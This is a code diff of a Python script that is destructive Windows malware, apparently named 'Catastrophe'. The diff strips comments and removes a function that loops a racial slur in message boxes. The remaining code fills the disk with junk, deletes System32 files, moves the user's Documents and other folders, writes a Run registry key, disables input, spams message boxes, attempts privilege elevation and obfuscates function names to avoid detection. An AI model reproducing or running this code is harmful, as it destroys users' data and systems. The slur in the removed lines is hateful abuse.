@@ -15,15 +15,15 @@ import base64
 import sys
 import winreg as winreg
 
-# Encrypt strings to avoid signature-based detection
+
 def encrypt_string(s):
     return base64.b64encode(s.encode()).decode()
 
-# Decrypt strings at runtime
+
 def decrypt_string(s):
     return base64.b64decode(s.encode()).decode()
 
-# Obfuscated and encrypted function names
+
 func_names = {
     'generate_junk_data': encrypt_string('_0x123456789abcdef'),
     'fill_disk_with_junk': encrypt_string('_0x987654321fedcba'),
@@ -40,15 +40,15 @@ func_names = {
     'main': encrypt_string('_0x0000000000000000')
 }
 
-# Dynamically load functions
+
 def load_function(name):
     return globals()[decrypt_string(func_names[name])]
 
-# Function to generate random junk data
+
 def generate_junk_data():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=1024 * 1024 * 1000))  # 1 GB of junk data
 
-# Function to fill disk with junk data
+
 def fill_disk_with_junk():
     try:
         junk_file_path = os.path.join(os.getenv('TEMP'), 'junk_data.txt')
@@ -57,7 +57,7 @@ def fill_disk_with_junk():
     except Exception as e:
         pass
 
-# Function to delete important system files
+
 def delete_system_files():
     system_files = [
         os.path.join(os.getenv('WINDIR'), 'System32', 'calc.exe'),
@@ -90,7 +90,7 @@ def delete_system_files():
         except Exception as e:
             pass
 
-# Function to move important folders to a different location
+
 def move_important_folders():
     important_folders = [
         os.path.join(os.getenv('USERPROFILE'), 'Documents'),
@@ -108,7 +108,7 @@ def move_important_folders():
         except Exception as e:
             pass
 
-# Function to corrupt system registry
+
 def corrupt_system_registry():
     try:
         subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', 'Catastrophe', '/t', 'REG_SZ', '/d', 'C:\\Windows\\System32\\cmd.exe', '/f'])
@@ -118,14 +118,14 @@ def corrupt_system_registry():
     except Exception as e:
         pass
 
-# Function to change desktop background
+
 def change_desktop_background(image_path):
     try:
         ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, image_path, win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE)
     except Exception as e:
         pass
 
-# Function to rename application names
+
 def rename_application_names():
     try:
         app_names = {
@@ -140,7 +140,7 @@ def rename_application_names():
     except Exception as e:
         pass
 
-# Function to change system volume
+
 def change_system_volume(volume_level):
     try:
         volume_control = ctypes.cast(ctypes.windll.winmm.waveOutGetVolume(ctypes.byref(ctypes.c_int(0))), ctypes.POINTER(ctypes.c_int))
@@ -149,7 +149,7 @@ def change_system_volume(volume_level):
     except Exception as e:
         pass
 
-# Function to disable mouse and keyboard
+
 def disable_mouse_and_keyboard():
     try:
         pyautogui.FAILSAFE = False
@@ -159,26 +159,16 @@ def disable_mouse_and_keyboard():
     except Exception as e:
         pass
 
-# Function to display annoying message boxes
-def display_annoying_message_boxes():
-    try:
-        while True:
-            messagebox.showwarning("Catastrophe", "You are fucked, nigger!")
-            time.sleep(1)
-    except Exception as e:
-        pass
-
-# Function to spam "HELLO!" message boxes all over the screen
 def spam_hello_message_boxes():
     try:
-        for _ in range(50):  # Spam 50 message boxes
+        for _ in range(50):
             root = tk.Tk()
             root.withdraw()
             messagebox.showinfo("HELLO!", "HELLO!")
     except Exception as e:
         pass
 
-# Function to elevate privileges
+
 def elevate_privileges():
     try:
         ctypes.windll.shell32.IsUserAnAdmin()
@@ -197,11 +187,10 @@ def main():
     delete_system_files()
     move_important_folders()
     corrupt_system_registry()
-    change_desktop_background(r'C:\path\to\your\image.jpg')  # Update this path to the image you want to set as background
+    change_desktop_background(r'C:\path\to\your\image.jpg')  
     rename_application_names()
-    change_system_volume(0)  # Set volume to 0
+    change_system_volume(0) 
     disable_mouse_and_keyboard()
-    display_annoying_message_boxes()
     spam_hello_message_boxes()
     messagebox.showinfo("Still want project ligma XD? \n fortnitepro01 and meflly100 was here", "")
     root.mainloop()
